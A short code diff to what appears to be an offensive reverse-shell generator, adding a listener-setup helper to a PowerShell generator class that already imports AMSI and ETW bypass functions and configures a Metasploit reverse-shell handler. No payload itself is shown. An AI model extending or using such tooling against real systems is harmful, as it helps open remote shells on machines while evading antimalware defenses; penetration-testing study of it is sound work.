@@ -1,7 +1,7 @@
 import base64
 import random
 from .base import (
-    RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, LISTENER_FMT,
+    RandomNamePool, ShellGenerator, ShellOptions, ShellResult, msf_handler, LISTENER_FMT, build_listener_setup,
 )
 from .obfuscate import (
     ps_amsi_bypass, ps_etw_bypass,
@@ -42,6 +42,7 @@ class PowerShellGenerator(ShellGenerator):
             listener=LISTENER_FMT.format(lport=opts.lport),
             tty_upgrade=None,
             msf_compat=msf_handler("cmd/windows/powershell_reverse_shell", opts.lhost, opts.lport),
+            listener_setup=build_listener_setup(opts.lhost, opts.lport),
         )
 
     def _tcpclient_raw(self, opts: ShellOptions, names: RandomNamePool | None) -> str:
